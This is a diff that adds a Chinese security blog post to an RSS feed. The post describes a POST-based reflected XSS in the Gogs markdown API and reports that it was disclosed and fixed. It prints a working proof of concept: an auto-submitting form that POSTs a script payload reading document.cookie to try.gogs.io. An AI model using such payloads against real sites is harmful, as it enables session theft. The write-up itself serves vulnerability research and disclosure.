@@ -3335,4 +3335,107 @@ mod.run(datastore)
 </div>
 </div>
 <p>添加了不是正常参数时候默认为空</p>
+]]></content></item><item><title/><link>https://blue-bird1.github.io/posts/gogs_post_xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://blue-bird1.github.io/posts/gogs_post_xss/</guid><description>通过form利用gogs的post型反射型xss 审计 在审计gogs代码时发现gogs的api允许渲染markdown.最初以为是无法利用的,但发现gogs这个api返回的content-type是html,并且没有csrf机制.
+1 2 3 4 5 6 7 m.Group(&amp;#34;/v1&amp;#34;, func() { // Handle preflight OPTIONS request m.Options(&amp;#34;/*&amp;#34;, func() {}) // Miscellaneous m.Post(&amp;#34;/markdown&amp;#34;, bind(api.MarkdownOption{}), misc2.Markdown) m.Post(&amp;#34;/markdown/raw&amp;#34;, misc2.MarkdownRaw) 但这个api仅仅允许post方法,不能通过常见的get方法来进行xss.
+构造poc 无法直接通过url 提交一个post请求,但可以通过form元素进行提交并直接重定向.
+最简单的提交例子
+1 2 3 4 5 6 &amp;lt;form name=Form action=url method=post&amp;gt; &amp;lt;input type=hidden name=xxx value=xxx&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; document.Form.submit(); &amp;lt;/script&amp;gt; 这和csrf都是通过伪造请求来利用 只是csrf是通过xhr请求 这是通过form来得到需要的重定向.
+最后的poc
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 &amp;lt;html&amp;gt; &amp;lt;body onload=&amp;#34;document.</description><content type="html"><![CDATA[
+
+<h3 id="通过form利用gogs的post型反射型xss">通过form利用gogs的post型反射型xss</h3>
+
+<h3 id="审计">审计</h3>
+
+<p>在审计gogs代码时发现gogs的api允许渲染markdown.最初以为是无法利用的,但发现gogs这个api返回的content-type是html,并且没有csrf机制.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-go" data-lang="go"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">m</span><span class="p">.</span><span class="nf">Group</span><span class="p">(</span><span class="s">&#34;/v1&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
+	<span class="c1">// Handle preflight OPTIONS request
+</span><span class="c1"></span>	<span class="nx">m</span><span class="p">.</span><span class="nf">Options</span><span class="p">(</span><span class="s">&#34;/*&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{})</span>
+
+	<span class="c1">// Miscellaneous
+</span><span class="c1"></span>	<span class="nx">m</span><span class="p">.</span><span class="nf">Post</span><span class="p">(</span><span class="s">&#34;/markdown&#34;</span><span class="p">,</span> <span class="nf">bind</span><span class="p">(</span><span class="nx">api</span><span class="p">.</span><span class="nx">MarkdownOption</span><span class="p">{}),</span> <span class="nx">misc2</span><span class="p">.</span><span class="nx">Markdown</span><span class="p">)</span>
+	<span class="nx">m</span><span class="p">.</span><span class="nf">Post</span><span class="p">(</span><span class="s">&#34;/markdown/raw&#34;</span><span class="p">,</span> <span class="nx">misc2</span><span class="p">.</span><span class="nx">MarkdownRaw</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>但这个api仅仅允许post方法,不能通过常见的get方法来进行xss.</p>
+
+<h3 id="构造poc">构造poc</h3>
+
+<p>无法直接通过url 提交一个post请求,但可以通过form元素进行提交并直接重定向.</p>
+
+<p>最简单的提交例子</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">name</span><span class="o">=</span><span class="s">Form</span> <span class="na">action</span><span class="o">=</span><span class="s">url</span> <span class="na">method</span><span class="o">=</span><span class="s">post</span><span class="p">&gt;</span>
+ <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">hidden</span> <span class="na">name</span><span class="o">=</span><span class="s">xxx</span> <span class="na">value</span><span class="o">=</span><span class="s">xxx</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+ <span class="nb">document</span><span class="p">.</span><span class="nx">Form</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>这和csrf都是通过伪造请求来利用 只是csrf是通过xhr请求 这是通过form来得到需要的重定向.</p>
+
+<p>最后的poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"> <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span> 
+
+<span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">&#34;document.forms[0].submit()&#34;</span><span class="p">&gt;</span> 
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span>
+   <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://try.gogs.io/api/v1/markdown&#34;</span><span class="p">&gt;</span> 
+
+   
+
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;text&#34;</span>
+   <span class="na">value</span><span class="o">=</span><span class="s">&#34;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#34;</span><span class="p">&gt;</span> 
+
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span> 
+
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span> </code></pre></td></tr></table>
+</div>
+</div>
+<p>漏洞时间线</p>
+
+<pre><code>1.25 发送提交漏洞邮件
+1.25 一小时后得到第一次回应
+1.27 漏洞修复
+</code></pre>
 ]]></content></item></channel></rss>
